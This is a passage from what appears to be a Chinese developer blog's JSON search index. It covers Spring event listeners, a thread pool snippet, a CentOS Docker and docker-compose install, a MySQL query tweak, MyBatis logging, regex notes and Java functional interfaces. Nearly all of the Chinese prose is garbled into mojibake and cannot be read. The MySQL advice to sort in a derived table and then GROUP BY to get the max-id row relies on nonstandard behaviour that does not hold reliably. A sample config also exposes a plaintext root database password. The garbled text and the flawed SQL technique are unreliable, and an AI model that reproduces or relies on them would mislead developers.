2ã€åˆ›å»ºä¸€ä¸ªä¸šåŠ¡Servieï¼Œå¹¶å‘å¸ƒApplicationEventäº‹ä»¶\n@Service @Transactional public class UserService { @Resource private UserDao userDao; @Resource private ApplicationContext applicationContext; public void testSave() { UserVO userVO = new UserVO(); userVO.setName(\u0026#34;123\u0026#34;); userVO.setAge(18); userDao.save(userVO); applicationContext.publishEvent(new UserEvent(this, userVO)); System.out.println(\u0026#34;123123\u0026#34;); try { Thread.sleep(2000); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(\u0026#34;123456\u0026#34;); } } 3ã€åˆ›å»ºä¸€ä¸ªäº‹åŠ¡ç›‘å¬å™¨ï¼Œäº‹åŠ¡æäº¤åï¼Œæ‰§è¡Œå‘å¸ƒçš„å†…å®¹\n@Component public class UserListener { @TransactionalEventListener public void register(UserEvent userEvent) { // è·å–ç”¨æˆ·å¯¹è±¡ UserVO userVO = userEvent.getUserVO(); // æ‰“å°ä¿¡æ¯ System.out.println(\u0026#34;äº‹åŠ¡æäº¤ï¼Œæ‰§è¡Œ\u0026#34;); } } Listener\r#\rå¯ä»¥åŒæ—¶ç›‘å¬ä¸€ä¸ªäº‹ä»¶æ‰§è¡Œä¸åŒçš„é€»è¾‘\n@EventListener @TransactionalEventListener ApplicationListener SmartApplicationListener 1ã€@EventListener äº‹ä»¶å‘å¸ƒåé©¬ä¸Šæ‰§è¡Œ\n@Component public class UserListener { @EventListener public void register(UserEvent userEvent) { // è·å–ç”¨æˆ·å¯¹è±¡ UserVO userVO = userEvent.getUserVO(); // æ‰“å°ä¿¡æ¯ System.out.println(\u0026#34;å‘å¸ƒåï¼Œé©¬ä¸Šæ‰§è¡Œ\u0026#34;); } } 2ã€@TransactionalEventListener äº‹åŠ¡æäº¤åï¼Œæ‰æ‰§è¡Œäº‹ä»¶\n@Component public class UserListener { @TransactionalEventListener public void register(UserEvent userEvent) { // è·å–ç”¨æˆ·å¯¹è±¡ UserVO userVO = userEvent.getUserVO(); // æ‰“å°ä¿¡æ¯ System.out.println(\u0026#34;äº‹åŠ¡æäº¤ï¼Œæ‰§è¡Œ\u0026#34;); } } 3ã€ApplicationListener åŸå§‹æ–¹å¼å®ç°ï¼Œç”¨æˆ·æ³¨å†Œç›‘å¬\n@Component public class User2Listener implements ApplicationListener\u0026lt;UserEvent\u0026gt; { @Override public void onApplicationEvent(UserEvent userEvent) { // è·å–ç”¨æˆ·å¯¹è±¡ UserVO userVO = userEvent.getUserVO(); // æ‰“å°ä¿¡æ¯ System.out.println(\u0026#34;æ‰§è¡Œ\u0026#34;); } } 4ã€SmartApplicationListener å®ç°æœ‰åºç›‘å¬\n@Component public class User3Listener implements SmartApplicationListener { @Override public boolean supportsEventType(Class\u0026lt;? extends ApplicationEvent\u0026gt; aClass) { // åªæœ‰UserEventç›‘å¬ç±»å‹æ‰ä¼šæ‰§è¡Œä¸‹é¢é€»è¾‘ return aClass == UserEvent.class; } @Override public boolean supportsSourceType(Class\u0026lt;?\u0026gt; sourceType) { // åªæœ‰åœ¨UserServiceå†…å‘å¸ƒçš„äº‹ä»¶ç±»å‹æ˜¯UserRegisterEventäº‹ä»¶æ—¶ï¼Œæ‰ä¼šæ‰§è¡Œä¸‹é¢é€»è¾‘ return sourceType == UserService.class; } @Override public int getOrder() { // åŒæ­¥æƒ…å†µä¸‹ç›‘å¬æ‰§è¡Œé¡ºåºï¼Œæ•°å€¼è¶Šå°è¯æ˜ä¼˜å…ˆçº§è¶Šé«˜ï¼Œæ‰§è¡Œé¡ºåºè¶Šé å‰ return 0; } @Override public String getListenerId() { // ç›‘å¬ID return SmartApplicationListener.super.getListenerId(); } @Override public void onApplicationEvent(ApplicationEvent applicationEvent) { // è·å–ç”¨æˆ·å¯¹è±¡ UserEvent userEvent = (UserEvent) applicationEvent; UserVO userVO = userEvent.getUserVO(); // æ‰“å°ä¿¡æ¯ System.out.println(\u0026#34;User3Listeneræ‰§è¡Œ\u0026#34;); } } å…¶ä»–åŸºæœ¬ç±»\r#\ræ·»åŠ ä¾èµ–åˆ›å»ºä¸€ä¸ªç®€å•é¡¹ç›®æ¥æµ‹è¯•\npom.xmlæ–‡ä»¶ï¼š\n\u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;druid-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.6\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-data-jpa\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.projectlombok\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;lombok\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;RELEASE\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;compile\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; application.yamlæ–‡ä»¶ï¼š\nspring: datasource: url: jdbc:mysql://127.0.0.1:3306/test?useUnicode=true\u0026amp;characterEncoding=UTF-8\u0026amp;useSSL=false driver-class-name: com.mysql.cj.jdbc.Driver username: root password: yuanmoc type: com.alibaba.druid.pool.DruidDataSource jpa: #è¿™ä¸ªå‚æ•°æ˜¯åœ¨å»ºè¡¨çš„æ—¶å€™ï¼Œå°†é»˜è®¤çš„å­˜å‚¨å¼•æ“åˆ‡æ¢ä¸º InnoDB ç”¨çš„ database-platform: org.hibernate.dialect.MySQL5InnoDBDialect #é…ç½®åœ¨æ—¥å¿—ä¸­æ‰“å°å‡ºæ‰§è¡Œçš„ SQL è¯­å¥ä¿¡æ¯ã€‚ show-sql: true hibernate: #é…ç½®æŒ‡æ˜åœ¨ç¨‹åºå¯åŠ¨çš„æ—¶å€™è¦åˆ é™¤å¹¶ä¸”åˆ›å»ºå®ä½“ç±»å¯¹åº”çš„è¡¨ ddl-auto: update application: name: springboot-test å®ä½“\n@Entity @Table(name = \u0026#34;user\u0026#34;) public class UserVO { @Id @GeneratedValue(strategy = GenerationType.AUTO) private Integer id; @Column(name = \u0026#34;name\u0026#34;) private String name; @Column(name = \u0026#34;age\u0026#34;) private Integer age; public String getName() { return name; } public void setName(String name) { this.name = name; } public Integer getAge() { return age; } public void setAge(Integer age) { this.age = age; } public void setId(Integer id) { this.id = id; } public Integer getId() { return id; } } dao\n@Repository public interface UserDao extends JpaRepository\u0026lt;UserVO, Integer\u0026gt; { } controller\n@Controller @ResponseBody public class UserController { @Resource private UserService userService; @RequestMapping(\u0026#34;/test\u0026#34;) public String test() { userService.testSave(); return \u0026#34;success\u0026#34;; } } "},{"id":42,"href":"/posts/history/%E5%88%9B%E5%BB%BA%E7%BA%BF%E7%A8%8B%E6%B1%A0/","title":"åˆ›å»ºçº¿ç¨‹æ± ","section":"æˆ‘çš„åšå®¢","content":"ThreadPoolExecutor executor = new ThreadPoolExecutor(5, 20, 2, TimeUnit.MINUTES, new LinkedBlockingQueue\u0026lt;\u0026gt;()); "},{"id":43,"href":"/posts/history/centos7%E5%AE%89%E8%A3%85docker/","title":"Centos7å®‰è£… Docker","section":"æˆ‘çš„åšå®¢","content":"\råœ¨centos7 ä¸Šå®‰è£… Docker\r#\rå®‰è£…\n# step 1: å®‰è£…å¿…è¦çš„ä¸€äº›ç³»ç»Ÿå·¥å…· sudo yum install -y yum-utils device-mapper-persistent-data lvm2 # Step 2: æ·»åŠ è½¯ä»¶æºä¿¡æ¯ sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo # Step 3: æ›´æ–°å¹¶å®‰è£… Docker-CE sudo yum makecache fast sudo yum -y install docker-ce # Step 4: å¼€å¯DockeræœåŠ¡ sudo service docker start æ³¨æ„ï¼šå…¶ä»–æ³¨æ„äº‹é¡¹åœ¨ä¸‹é¢çš„æ³¨é‡Šä¸­ # å®˜æ–¹è½¯ä»¶æºé»˜è®¤å¯ç”¨äº†æœ€æ–°çš„è½¯ä»¶ï¼Œæ‚¨å¯ä»¥é€šè¿‡ç¼–è¾‘è½¯ä»¶æºçš„æ–¹å¼è·å–å„ä¸ªç‰ˆæœ¬çš„è½¯ä»¶åŒ…ã€‚ä¾‹å¦‚å®˜æ–¹å¹¶æ²¡æœ‰å°†æµ‹è¯•ç‰ˆæœ¬çš„è½¯ä»¶æºç½®ä¸ºå¯ç”¨ï¼Œä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼å¼€å¯ã€‚åŒç†å¯ä»¥å¼€å¯å„ç§æµ‹è¯•ç‰ˆæœ¬ç­‰ã€‚ # vim /etc/yum.repos.d/docker-ce.repo # å°† [docker-ce-test] ä¸‹æ–¹çš„ enabled=0 ä¿®æ”¹ä¸º enabled=1 # # å®‰è£…æŒ‡å®šç‰ˆæœ¬çš„Docker-CE: # Step 1: æŸ¥æ‰¾Docker-CEçš„ç‰ˆæœ¬: # yum list docker-ce.x86_64 --showduplicates | sort -r # Loading mirror speeds from cached hostfile # Loaded plugins: branch, fastestmirror, langpacks # docker-ce.x86_64 17.03.1.ce-1.el7.centos docker-ce-stable # docker-ce.x86_64 17.03.1.ce-1.el7.centos @docker-ce-stable # docker-ce.x86_64 17.03.0.ce-1.el7.centos docker-ce-stable # Available Packages # Step2 : å®‰è£…æŒ‡å®šç‰ˆæœ¬çš„Docker-CE: (VERSION ä¾‹å¦‚ä¸Šé¢çš„ 17.03.0.ce.1-1.el7.centos) # sudo yum -y install docker-ce-[VERSION] # æ³¨æ„ï¼šåœ¨æŸäº›ç‰ˆæœ¬ä¹‹åï¼Œdocker-ceå®‰è£…å‡ºç°äº†å…¶ä»–ä¾èµ–åŒ…ï¼Œå¦‚æœå®‰è£…å¤±è´¥çš„è¯è¯·å…³æ³¨é”™è¯¯ä¿¡æ¯ã€‚ä¾‹å¦‚ docker-ce 17.03 ä¹‹åï¼Œéœ€è¦å…ˆå®‰è£… docker-ce-selinuxã€‚ # yum list docker-ce-selinux- --showduplicates | sort -r # sudo yum -y install docker-ce-selinux-[VERSION] # é€šè¿‡ç»å…¸ç½‘ç»œã€VPCç½‘ç»œå†…ç½‘å®‰è£…æ—¶ï¼Œç”¨ä»¥ä¸‹å‘½ä»¤æ›¿æ¢Step 2ä¸­çš„å‘½ä»¤ # ç»å…¸ç½‘ç»œï¼š # sudo yum-config-manager --add-repo http://mirrors.aliyuncs.com/docker-ce/linux/centos/docker-ce.repo # VPCç½‘ç»œï¼š # sudo yum-config-manager --add-repo http://mirrors.could.aliyuncs.com/docker-ce/linux/centos/docker-ce.repo å®‰è£…æ£€éªŒ\ndocker version å®‰è£…Docker-compose\r#\råœ°å€ï¼šhttps://github.com/docker/compose/releases\nä¸‹è½½ï¼šå¦‚æœè¦å®‰è£…æ–°ç‰ˆæœ¬ï¼Œåªè¦æŠŠ1.29.2æ”¹æˆå¯¹åº”çš„ç‰ˆæœ¬å·å°±å¯ä»¥ curl -L \u0026#34;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)\u0026#34; -o /usr/local/bin/docker-compose æ·»åŠ å¯æ‰§è¡Œæƒé™ï¼š chmod +x /usr/local/bin/docker-compose å®‰è£…æ£€éªŒï¼š docker-compose version æ›´æ¢é˜¿é‡Œæº\r#\råœ°å€ï¼šhttps://cr.console.aliyun.com/ é€‰æ‹©ï¼šé•œåƒå·¥å…· -\u0026gt; é•œåƒåŠ é€Ÿå™¨\né…ç½®é•œåƒåŠ é€Ÿå™¨\né’ˆå¯¹Dockerå®¢æˆ·ç«¯ç‰ˆæœ¬å¤§äº 1.10.0 çš„ç”¨æˆ·\næ‚¨å¯ä»¥é€šè¿‡ä¿®æ”¹daemoné…ç½®æ–‡ä»¶/etc/docker/daemon.jsonæ¥ä½¿ç”¨åŠ é€Ÿå™¨\nsudo mkdir -p /etc/docker sudo tee /etc/docker/daemon.json \u0026lt;\u0026lt;-\u0026#39;EOF\u0026#39; { \u0026#34;registry-mirrors\u0026#34;: [\u0026#34;https://c9msosvw.mirror.aliyuncs.com\u0026#34;] } EOF sudo systemctl daemon-reload sudo systemctl restart docker "},{"id":44,"href":"/posts/history/mysqlon%E4%BD%BF%E7%94%A8%E9%81%87%E5%9D%91/","title":"Mysqlonä½¿ç”¨é‡å‘","section":"æˆ‘çš„åšå®¢","content":"æœ¬æ¥æƒ³æŸ¥è¯¢åˆ†ç»„ä¸‹idæœ€å¤§çš„ä¸€æ¡æ•°æ®ï¼Œè¯­å¥å¦‚ä¸‹ï¼š\nselect * from order_delivery where id in ( select max(id) id from order_delivery where cid \u0026gt;= _IN_CUR_ID and cid \u0026lt; _IN_CUR_ID + _IN_STEP and update_time \u0026gt; \u0026#39;2021-03-01\u0026#39; group by cid, delivery_type ); ç»“æœå‘ç°ï¼Œonä¸‹çš„å­è¯­å¥ä¸èµ°ç´¢å¼•äº†ã€‚æ•°æ®å¤ªå¤šï¼Œç»“æœè·‘ä¸åŠ¨äº†ã€‚\næ”¹äº†ä¸€ä¸‹ï¼Œå…ˆæ’åºå†åˆ†ç»„æŸ¥è¯¢ï¼Œè¿™æ ·é¿å…äº†onå­æŸ¥è¯¢çš„ä½¿ç”¨ï¼ŒæˆåŠŸèµ°ä¸Šäº†ç´¢å¼•ã€‚\nselect * from (select * from order_delivery where cid \u0026gt;= _IN_CUR_ID and cid \u0026lt; _IN_CUR_ID + _IN_STEP and update_time \u0026gt; \u0026#39;2021-03-01\u0026#39; order by id desc) t group by cid, delivery_type; "},{"id":45,"href":"/posts/history/mybatis%E6%89%93%E5%8D%B0%E6%97%A5%E5%BF%97/","title":"My Batisæ‰“å°æ—¥å¿—","section":"æˆ‘çš„åšå®¢","content":"åœ¨Mybatis çš„é…ç½®æ–‡ä»¶ä¸­æ·»åŠ ï¼š\n\u0026lt;settings\u0026gt; \u0026lt;!-- æ‰“å°æŸ¥è¯¢è¯­å¥ --\u0026gt; \u0026lt;setting name=\u0026#34;logImpl\u0026#34; value=\u0026#34;STDOUT_LOGGING\u0026#34; /\u0026gt; \u0026lt;/settings\u0026gt; åŒæ—¶å¯ä»¥é…åˆIDEAæ’ä»¶ MyBatis Log Plugin ä¸€èµ·ä½¿ç”¨ã€‚\n"},{"id":46,"href":"/posts/history/%E6%AD%A3%E5%88%99%E5%B0%8F%E8%AE%B0/","title":"æ­£åˆ™å°è®°","section":"æˆ‘çš„åšå®¢","content":"\rå¸¸ç”¨å…ƒå­—ç¬¦\r#\rä»£ç  è¯´æ˜ . åŒ¹é…é™¤æ¢è¡Œç¬¦ä»¥å¤–çš„ä»»æ„å­—ç¬¦ \\w åŒ¹é…å­—æ¯æˆ–æ•°å­—æˆ–ä¸‹åˆ’çº¿ \\s åŒ¹é…ä»»æ„çš„ç©ºç™½ç¬¦ \\d åŒ¹é…æ•°å­— \\b åŒ¹é…å•è¯çš„å¼€å§‹æˆ–ç»“æŸ ^ åŒ¹é…å­—ç¬¦ä¸²çš„å¼€å§‹ $ åŒ¹é…å­—ç¬¦ä¸²çš„ç»“æŸ å¸¸ç”¨é™å®šç¬¦\r#\rä»£ç /è¯­æ³• è¯´æ˜ * é‡å¤é›¶æ¬¡æˆ–æ›´å¤šæ¬¡ + é‡å¤ä¸€æ¬¡æˆ–æ›´å¤šæ¬¡ ? é‡å¤é›¶æ¬¡æˆ–ä¸€æ¬¡ {n} é‡å¤næ¬¡ {n,} é‡å¤næ¬¡æˆ–æ›´å¤šæ¬¡ {n,m} é‡å¤nåˆ°mæ¬¡ å¸¸ç”¨åä¹‰è¯\r#\rä»£ç /è¯­æ³• è¯´æ˜ \\W åŒ¹é…ä»»æ„ä¸æ˜¯å­—æ¯ï¼Œæ•°å­—ï¼Œä¸‹åˆ’çº¿ï¼Œæ±‰å­—çš„å­—ç¬¦ \\S åŒ¹é…ä»»æ„ä¸æ˜¯ç©ºç™½ç¬¦çš„å­—ç¬¦ \\D åŒ¹é…ä»»æ„éæ•°å­—çš„å­—ç¬¦ \\B åŒ¹é…ä¸æ˜¯å•è¯å¼€å¤´æˆ–ç»“æŸçš„ä½ç½® [^x] åŒ¹é…é™¤äº†xä»¥å¤–çš„ä»»æ„å­—ç¬¦ [^aeiou] åŒ¹é…é™¤äº†aeiouè¿™å‡ ä¸ªå­—æ¯ä»¥å¤–çš„ä»»æ„å­—ç¬¦ è´ªå©ªåŒ¹é…/å…¶ä»–\r#\rå­—ç¬¦ æè¿° (pattern) åŒ¹é… pattern å¹¶è·å–è¿™ä¸€åŒ¹é…ã€‚æ‰€è·å–çš„åŒ¹é…å¯ä»¥ä»äº§ç”Ÿçš„ Matches é›†åˆå¾—åˆ°ï¼Œåœ¨VBScript ä¸­ä½¿ç”¨ SubMatches é›†åˆï¼Œåœ¨JScript ä¸­åˆ™ä½¿ç”¨ $0â€¦$9 å±æ€§ã€‚è¦åŒ¹é…åœ†æ‹¬å·å­—ç¬¦ï¼Œè¯·ä½¿ç”¨ \u0026lsquo;(\u0026rsquo; æˆ– \u0026lsquo;)\u0026rsquo;ã€‚ (?:pattern) åŒ¹é… pattern ä½†ä¸è·å–åŒ¹é…ç»“æœï¼Œä¹Ÿå°±æ˜¯è¯´è¿™æ˜¯ä¸€ä¸ªéè·å–åŒ¹é…ï¼Œä¸è¿›è¡Œå­˜å‚¨ä¾›ä»¥åä½¿ç”¨ã€‚è¿™åœ¨ä½¿ç”¨ \u0026ldquo;æˆ–\u0026rdquo; å­—ç¬¦ (|) æ¥ç»„åˆä¸€ä¸ªæ¨¡å¼çš„å„ä¸ªéƒ¨åˆ†æ˜¯å¾ˆæœ‰ç”¨ã€‚ä¾‹å¦‚ï¼Œ \u0026lsquo;industr(?:y|ies) å°±æ˜¯ä¸€ä¸ªæ¯” \u0026lsquo;industry|industries\u0026rsquo; æ›´ç®€ç•¥çš„è¡¨è¾¾å¼ã€‚ (?=pattern) æ­£å‘è‚¯å®šé¢„æŸ¥ï¼ˆlook ahead positive assertï¼‰ï¼Œåœ¨ä»»ä½•åŒ¹é…patternçš„å­—ç¬¦ä¸²å¼€å§‹å¤„åŒ¹é…æŸ¥æ‰¾å­—ç¬¦ä¸²ã€‚è¿™æ˜¯ä¸€ä¸ªéè·å–åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¯¥åŒ¹é…ä¸éœ€è¦è·å–ä¾›ä»¥åä½¿ç”¨ã€‚ä¾‹å¦‚ï¼Œ\u0026ldquo;Windows(?=95|98|NT|2000)\u0026ldquo;èƒ½åŒ¹é…\u0026quot;Windows2000\u0026quot;ä¸­çš„\u0026quot;Windows\u0026rdquo;ï¼Œä½†ä¸èƒ½åŒ¹é…\u0026quot;Windows3.1\u0026quot;ä¸­çš„\u0026quot;Windows\u0026rdquo;ã€‚é¢„æŸ¥ä¸æ¶ˆè€—å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ä¸€ä¸ªåŒ¹é…å‘ç”Ÿåï¼Œåœ¨æœ€åä¸€æ¬¡åŒ¹é…ä¹‹åç«‹å³å¼€å§‹ä¸‹ä¸€æ¬¡åŒ¹é…çš„æœç´¢ï¼Œè€Œä¸æ˜¯ä»åŒ…å«é¢„æŸ¥çš„å­—ç¬¦ä¹‹åå¼€å§‹ã€‚ (?!pattern) æ­£å‘å¦å®šé¢„æŸ¥(negative assert)ï¼Œåœ¨ä»»ä½•ä¸åŒ¹é…patternçš„å­—ç¬¦ä¸²å¼€å§‹å¤„åŒ¹é…æŸ¥æ‰¾å­—ç¬¦ä¸²ã€‚è¿™æ˜¯ä¸€ä¸ªéè·å–åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¯¥åŒ¹é…ä¸éœ€è¦è·å–ä¾›ä»¥åä½¿ç”¨ã€‚ä¾‹å¦‚\u0026quot;Windows(?!95|98|NT|2000)\u0026ldquo;èƒ½åŒ¹é…\u0026quot;Windows3.1\u0026quot;ä¸­çš„\u0026quot;Windows\u0026rdquo;ï¼Œä½†ä¸èƒ½åŒ¹é…\u0026quot;Windows2000\u0026quot;ä¸­çš„\u0026quot;Windows\u0026quot;ã€‚é¢„æŸ¥ä¸æ¶ˆè€—å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ä¸€ä¸ªåŒ¹é…å‘ç”Ÿåï¼Œåœ¨æœ€åä¸€æ¬¡åŒ¹é…ä¹‹åç«‹å³å¼€å§‹ä¸‹ä¸€æ¬¡åŒ¹é…çš„æœç´¢ï¼Œè€Œä¸æ˜¯ä»åŒ…å«é¢„æŸ¥çš„å­—ç¬¦ä¹‹åå¼€å§‹ã€‚ (?\u0026lt;=pattern) åå‘(look behind)è‚¯å®šé¢„æŸ¥ï¼Œä¸æ­£å‘è‚¯å®šé¢„æŸ¥ç±»ä¼¼ï¼Œåªæ˜¯æ–¹å‘ç›¸åã€‚ä¾‹å¦‚ï¼Œ\u0026quot;`(?\u0026lt;=95 (?\u0026lt;!pattern) åå‘å¦å®šé¢„æŸ¥ï¼Œä¸æ­£å‘å¦å®šé¢„æŸ¥ç±»ä¼¼ï¼Œåªæ˜¯æ–¹å‘ç›¸åã€‚ä¾‹å¦‚\u0026quot;`(?\u0026lt;!95 ä¿®é¥°ç¬¦ï¼ˆæ ‡è®°flagsï¼‰\r#\r/pattern/flags å¦‚ï¼šå…¨å±€åŒ¹é…g /pattern/g ä¿®é¥°ç¬¦ å«ä¹‰ æè¿° i ignore - ä¸åŒºåˆ†å¤§å°å†™ å°†åŒ¹é…è®¾ç½®ä¸ºä¸åŒºåˆ†å¤§å°å†™ï¼Œæœç´¢æ—¶ä¸åŒºåˆ†å¤§å°å†™: A å’Œ a æ²¡æœ‰åŒºåˆ«ã€‚ g global - å…¨å±€åŒ¹é… æŸ¥æ‰¾æ‰€æœ‰çš„åŒ¹é…é¡¹ã€‚ m multi line - å¤šè¡ŒåŒ¹é… ä½¿è¾¹ç•Œå­—ç¬¦ ^ å’Œ $ åŒ¹é…æ¯ä¸€è¡Œçš„å¼€å¤´å’Œç»“å°¾ï¼Œè®°ä½æ˜¯å¤šè¡Œï¼Œè€Œä¸æ˜¯æ•´ä¸ªå­—ç¬¦ä¸²çš„å¼€å¤´å’Œç»“å°¾ã€‚ s ç‰¹æ®Šå­—ç¬¦åœ†ç‚¹ . ä¸­åŒ…å«æ¢è¡Œç¬¦ \\n é»˜è®¤æƒ…å†µä¸‹çš„åœ†ç‚¹ . æ˜¯ åŒ¹é…é™¤æ¢è¡Œç¬¦ \\n ä¹‹å¤–çš„ä»»ä½•å­—ç¬¦ï¼ŒåŠ ä¸Š s ä¿®é¥°ç¬¦ä¹‹å, . ä¸­åŒ…å«æ¢è¡Œç¬¦ \\nã€‚ è¿ç®—ç¬¦ä¼˜å…ˆçº§\r#\rè¿ç®—ç¬¦ æè¿° \\ è½¬ä¹‰ç¬¦ (), (?:), (?=), [] åœ†æ‹¬å·å’Œæ–¹æ‹¬å· *, +, ?, {n}, {n,}, {n,m} é™å®šç¬¦ ^, $, \\ä»»ä½•å…ƒå­—ç¬¦ã€ä»»ä½•å­—ç¬¦ å®šä½ç‚¹å’Œåºåˆ—ï¼ˆå³ï¼šä½ç½®å’Œé¡ºåºï¼‰ | æ›¿æ¢ï¼Œ\u0026ldquo;æˆ–\u0026quot;æ“ä½œ å­—ç¬¦å…·æœ‰é«˜äºæ›¿æ¢è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§ï¼Œä½¿å¾—\u0026quot;m|food\u0026quot;åŒ¹é…\u0026quot;m\u0026quot;æˆ–\u0026quot;food\u0026rdquo;ã€‚è‹¥è¦åŒ¹é…\u0026quot;mood\u0026quot;æˆ–\u0026quot;food\u0026quot;ï¼Œè¯·ä½¿ç”¨æ‹¬å·åˆ›å»ºå­è¡¨è¾¾å¼ï¼Œä»è€Œäº§ç”Ÿ\u0026quot;(m|f)ood\u0026quot;ã€‚ "},{"id":47,"href":"/posts/history/jdk8@functionalinterface%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"Jdk8@ Functional Interfaceçš„ä½¿ç”¨","section":"æˆ‘çš„åšå®¢","content":"ç®€ä»‹\njava 8å¼•å…¥äº†lambdaè¡¨è¾¾å¼ï¼Œlambdaè¡¨è¾¾å¼å®é™…ä¸Šè¡¨ç¤ºçš„å°±æ˜¯ä¸€ä¸ªåŒ¿åçš„functionã€‚\nåœ¨java 8ä¹‹å‰ï¼Œå¦‚æœéœ€è¦ä½¿ç”¨åˆ°åŒ¿åfunctionéœ€è¦newä¸€ä¸ªç±»çš„å®ç°ï¼Œä½†æ˜¯æœ‰äº†lambdaè¡¨è¾¾å¼ä¹‹åï¼Œä¸€åˆ‡éƒ½å˜çš„éå¸¸ç®€ä»‹ã€‚\næˆ‘ä»¬çœ‹ä¸€ä¸ªä¹‹å‰è®²çº¿ç¨‹æ± çš„æ—¶å€™çš„ä¸€ä¸ªä¾‹å­ï¼š\n//ExecutorService using class ExecutorService executorService = Executors.newSingleThreadExecutor(); executorService.submit(new Runnable() { @Override public void run() { log.info(\u0026#34;new runnable\u0026#34;); } }); executorService.submitéœ€è¦æ¥æ”¶ä¸€ä¸ªRunnableç±»ï¼Œä¸Šé¢çš„ä¾‹å­ä¸­æˆ‘ä»¬newäº†ä¸€ä¸ªRunnableç±»ï¼Œå¹¶å®ç°äº†å®ƒçš„runï¼ˆï¼‰æ–¹æ³•ã€‚\nä¸Šé¢çš„ä¾‹å­å¦‚æœç”¨lambdaè¡¨è¾¾å¼æ¥é‡å†™ï¼Œåˆ™å¦‚ä¸‹æ‰€ç¤ºï¼š\n//ExecutorService using lambda executorService.submit(()-\u0026gt;log.info(\u0026#34;new runnable\u0026#34;)); çœ‹èµ·æ˜¯ä¸æ˜¯å¾ˆç®€å•ï¼Œä½¿ç”¨lambdaè¡¨è¾¾å¼å°±å¯ä»¥çœç•¥åŒ¿åç±»çš„æ„é€ ï¼Œå¹¶ä¸”å¯è¯»æ€§æ›´å¼ºã€‚\né‚£ä¹ˆæ˜¯ä¸æ˜¯æ‰€æœ‰çš„åŒ¿åç±»éƒ½å¯ä»¥ç”¨lambdaè¡¨è¾¾å¼æ¥é‡æ„å‘¢ï¼Ÿä¹Ÿä¸æ˜¯ã€‚\næˆ‘ä»¬çœ‹ä¸‹Runnableç±»æœ‰ä»€ä¹ˆç‰¹ç‚¹ï¼š\n@FunctionalInterface public interface Runnable Runnableç±»ä¸Šé¢æœ‰ä¸€ä¸ª@FunctionalInterfaceæ³¨è§£ã€‚è¿™ä¸ªæ³¨è§£å°±æ˜¯æˆ‘ä»¬ä»Šå¤©è¦è®²åˆ°çš„Functional Interfaceã€‚\nFunctional Interface\r#\rFunctional Interfaceæ˜¯æŒ‡å¸¦æœ‰ @FunctionalInterface æ³¨è§£çš„interfaceã€‚å®ƒçš„ç‰¹ç‚¹æ˜¯å…¶ä¸­åªæœ‰ä¸€ä¸ªå­ç±»å¿…é¡»è¦å®ç°çš„abstractæ–¹æ³•ã€‚å¦‚æœabstractæ–¹æ³•å‰é¢å¸¦æœ‰defaultå…³é”®å­—ï¼Œåˆ™ä¸åšè®¡ç®—ã€‚\nå…¶å®è¿™ä¸ªä¹Ÿå¾ˆå¥½ç†è§£ï¼Œå› ä¸ºFunctional Interfaceæ”¹å†™æˆä¸ºlambdaè¡¨è¾¾å¼ä¹‹åï¼Œå¹¶æ²¡æœ‰æŒ‡å®šå®ç°çš„å“ªä¸ªæ–¹æ³•ï¼Œå¦‚æœæœ‰å¤šä¸ªæ–¹æ³•éœ€è¦å®ç°çš„è¯ï¼Œå°±ä¼šæœ‰é—®é¢˜ã€‚\n@Documented @Retention(RetentionPolicy.RUNTIME) @Target(ElementType.TYPE) public @interface FunctionalInterface {} Functional Interfaceä¸€èˆ¬éƒ½åœ¨java.util.functionåŒ…ä¸­ã€‚\næ ¹æ®è¦å®ç°çš„æ–¹æ³•å‚æ•°å’Œè¿”å›å€¼çš„ä¸åŒï¼ŒFunctional Interfaceå¯ä»¥åˆ†ä¸ºå¾ˆå¤šç§ï¼Œä¸‹é¢æˆ‘ä»¬åˆ†åˆ«æ¥ä»‹ç»ã€‚\nFunctionï¼šä¸€ä¸ªå‚æ•°ä¸€ä¸ªè¿”å›å€¼\r#\rFunctionæ¥å£å®šä¹‰äº†ä¸€ä¸ªæ–¹æ³•ï¼Œæ¥æ”¶ä¸€ä¸ªå‚æ•°ï¼Œè¿”å›ä¸€ä¸ªå‚æ•°ã€‚\n@FunctionalInterface public interface Function\u0026lt;T, R\u0026gt; { /** * Applies this function to the given argument. * * @param t the function argument * @return the function result */ R apply(T t)ï¼› } ä¸€èˆ¬æˆ‘ä»¬åœ¨å¯¹é›†åˆç±»è¿›è¡Œå¤„ç†çš„æ—¶å€™ï¼Œä¼šç”¨åˆ°Functionã€‚\nMap\u0026lt;String, Integer\u0026gt; nameMap = new HashMap\u0026lt;\u0026gt;(); Integer value = 